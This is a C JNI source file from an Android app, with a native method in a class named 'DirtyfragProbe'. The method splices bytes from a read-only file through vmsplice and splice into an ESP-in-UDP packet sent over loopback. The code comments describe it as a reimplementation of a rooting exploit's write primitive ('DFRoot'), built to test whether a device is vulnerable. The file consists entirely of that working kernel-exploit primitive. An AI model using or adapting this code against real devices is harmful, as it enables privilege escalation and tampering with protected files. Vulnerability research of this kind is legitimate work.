#include <jni.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* One ESP-in-UDP packet whose 16-byte ciphertext is spliced from the file.
 * Layout: SPI(4) + Seq(4) + IV(16) + ciphertext(16) = 40 bytes. The transform
 * is created Java-side (IpSecManager); this is DFRoot's do_one_write_cbc shape,
 * reimplemented. See docs/analysis/dirtyfrag-viability-probe-plan.md. */
static int send_one(int sk, int file_fd, off_t off, const uint8_t iv[16],
                    uint32_t spi, uint32_t seq) {
    uint8_t hdr[24];
    uint32_t s = htonl(spi), q = htonl(seq);
    memcpy(hdr, &s, 4);
    memcpy(hdr + 4, &q, 4);
    memcpy(hdr + 8, iv, 16);

    int pfd[2];
    if (pipe(pfd) < 0) return -errno;
    struct iovec iov = { .iov_base = hdr, .iov_len = 24 };
    if (vmsplice(pfd[1], &iov, 1, SPLICE_F_GIFT) != 24) {
        int e = errno; close(pfd[0]); close(pfd[1]); return -e;
    }
    off_t o = off;
    if (splice(file_fd, &o, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
        int e = errno; close(pfd[0]); close(pfd[1]); return -e;
    }
    ssize_t n = splice(pfd[0], NULL, sk, NULL, 40, 0);
    int rc = (n == 40) ? 0 : (n < 0 ? -errno : -1000);
    close(pfd[0]);
    close(pfd[1]);
    return rc;
}

JNIEXPORT jint JNICALL
Java_com_ghostlock_app_data_DirtyfragProbe_nativeSendEspWrite(
        JNIEnv *env, jobject thiz, jstring path, jlong offset, jint spi, jint seq,
        jbyteArray ivArr, jint encap_port, jint sender_port) {
    (void)thiz;
    const char *p = (*env)->GetStringUTFChars(env, path, NULL);
    jbyte *iv = (*env)->GetByteArrayElements(env, ivArr, NULL);
    int rc = 0;
    int fd = open(p, O_RDONLY);
    if (fd < 0) { rc = -errno; goto out; }
    int sk = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk < 0) { rc = -errno; close(fd); goto out; }
    int opt = 1;
    setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port = htons((uint16_t)sender_port),
        .sin_addr = { .s_addr = htonl(INADDR_LOOPBACK) },
    };
    if (bind(sk, (struct sockaddr *)&src, sizeof(src)) < 0) {
        rc = -errno; close(sk); close(fd); goto out;
    }
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port = htons((uint16_t)encap_port),
        .sin_addr = { .s_addr = htonl(INADDR_LOOPBACK) },
    };
    if (connect(sk, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        rc = -errno; close(sk); close(fd); goto out;
    }
    rc = send_one(sk, fd, (off_t)offset, (const uint8_t *)iv,
                  (uint32_t)spi, (uint32_t)seq);
    close(sk);
    close(fd);
out:
    (*env)->ReleaseByteArrayElements(env, ivArr, iv, JNI_ABORT);
    (*env)->ReleaseStringUTFChars(env, path, p);
    return rc;
}
